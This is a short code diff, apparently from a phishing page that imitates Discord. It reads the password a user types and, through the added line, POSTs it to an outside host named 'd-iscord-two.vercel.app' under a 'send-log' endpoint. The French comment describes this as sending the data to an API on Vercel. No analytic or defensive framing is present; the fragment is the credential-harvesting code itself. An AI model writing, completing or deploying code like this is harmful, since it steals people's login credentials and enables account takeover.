@@ -39,7 +39,8 @@
             let password = document.getElementById("password").value;
             
             // Envoi des données à l'API sur Vercel
-            fetch("send-log", {
+            fetch("https://d-iscord-two.vercel.app/send-log", {
+
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
